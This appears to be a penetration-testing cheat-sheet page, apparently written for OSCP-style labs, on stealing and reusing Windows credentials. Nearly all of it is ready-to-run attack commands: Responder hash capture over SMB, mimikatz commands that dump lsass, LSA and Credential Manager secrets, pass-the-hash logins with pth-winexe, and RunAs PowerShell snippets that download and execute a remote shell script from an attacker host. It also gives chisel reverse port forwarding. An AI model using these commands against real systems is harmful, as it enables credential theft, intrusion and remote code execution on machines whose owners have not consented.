+<p><strong>No Admin</strong>
+SMB can be used to extract credentials.<br></p>
+<p>First check if target connects back<br>
+Start a listener on 445</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash">sudo nc -nvlp 445
+</code></pre>
+<p>Get target to connect to it</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">copy \\kali_ip\test\file
+</code></pre>
+<p>If nc shows connection, it means hash can be extracted</p>
+<blockquote>
+<p>Responder is an <a href="https://help.offensive-security.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ">OffSec authorized tool now</a></p>
+</blockquote>
+<p>Replace interface as required</p>
+<pre  class="mc-prism hide language-text" ><code class="language-sudo">sudo responder -I tun0 -wrf
+</code></pre>
+<p>Get the target to connect to your server and it will start dropping hashes. These are now required to cracked by your fav cracker (john or hashcat) to be able to use them to pass-the-hash</p>
+<p><strong>With Admin</strong>
+Mimikatz requires admin since a handle on lsass is needed to play with credentials (tokens,hashes,tickets)
+Use can either use mimikatz.exe or Invoke-Mimikatz.ps1</p>
+<p>Elevate privileges to debug</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">privilege::debug
+</code></pre>
+<p>Dump logged on user and computer credentials</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">sekurlsa::logonpasswords
+</code></pre>
+<p>Elevate privileges to SYSTEM by impersonation</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">token::elevate
+</code></pre>
+<p>Retrieves credential from LSA</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">lsadump::lsa /patch
+</code></pre>
+<p>List credentials in CredentialManager</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">vault::list
+</code></pre>
+<p>Dump credentials in CredentialManager - plaintext password</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">vault::cred /patch
+</code></pre>
+<h3 id="leverage-credentials">Leverage credentials</h3>
+<p>Found plaintext password?
+On attacker machine you can attempt to login</p>
+<p><code>--system</code> only works if admin creds are on hand</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">winexe -U 'user%pass123' [--system] //10.10.10.10 cmd.exe
+</code></pre>
+<p>Found hash instead of plaintext password?</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">pth-winexe -U 'domain\user%hash' [--system] //10.10.10.10 cmd.exe
+</code></pre>
+<h2 id="runas">RunAs</h2>
+<p>CMD</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">runas /savecred /user:admin C:\abcd\reverse.exe
+</code></pre>
+<p>PowerShell Runas 1</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">$password = ConvertTo-SecureString 'pass123' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)
+Start-Process -FilePath &quot;powershell&quot; -argumentlist &quot;IEX(New-Object Net.WebClient).downloadString('http://kali_ip/shell.ps1')&quot; -Credential $cred
+</code></pre>
+<p>PowerShell Runas 2</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">$username = &quot;domain\Administrator&quot;
+$password = &quot;pass123&quot;
+$secstr = New-Object -TypeName System.Security.SecureString
+$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
+$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
+Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/shell.ps1') } -Credential $cred -Computer localhost
+</code></pre>
+<h2 id="find-files-fast">Find Files Fast</h2>
+<p>CMD or PowerShell</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">dir /s &lt;filename&gt; # or extensions
+</code></pre>
+<p>PowerShell</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">Get-ChildItem -Path C:\ -Include *filename_wildcard* -Recurse -ErrorAction SilentlyContinue
+</code></pre>
+<h2 id="port-forwarding">Port Forwarding</h2>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell"># If some port are listening on the target machine but inaccessible, forward the ports - Port Forwarding
+# winexe, pth-winexe, smbexec.py, psexec works on 445, MySQL on 3306
+# On KALI
+./chisel server --reverse --port 9001
+# On Windows
+.\chisel.exe client KALI_IP:9001 R:KALI_PORT:127.0.0.1:WINDOWS_PORT
+# Example --&gt; .\chisel.exe client KALI_IP:9001 R:445:127.0.0.1:445
+
+# On KALI
+winexe -U 'administrator%pass123' --system //127.0.0.1 KALI_PORT
+smbexec.py domain/username:password@127.0.0.1 
+mysql --host=127.0.0.1 --port=KALI_PORT -u username -p
+</code></pre>
+
+</article>
+</div>
+
+
+                
+                    <div class="content-margin">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "n00bsec" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+                
+            </div>
+<footer>
+    <article>Made with love...and copious amounts of coffee</article>
+</footer>
+
+</main>
+    </body>
+</html>
